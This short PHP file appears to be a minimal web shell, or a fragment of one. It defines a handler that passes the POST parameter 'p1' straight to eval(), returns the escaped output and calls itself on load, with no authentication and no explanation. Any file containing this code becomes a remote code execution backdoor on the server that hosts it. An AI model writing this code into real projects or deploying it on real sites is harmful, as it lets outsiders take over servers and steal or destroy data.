<?php
function actionPhp() {
	ob_start();
	eval($_POST['p1']);
	echo htmlspecialchars(ob_get_clean());
}

call_user_func('actionPhp');
?>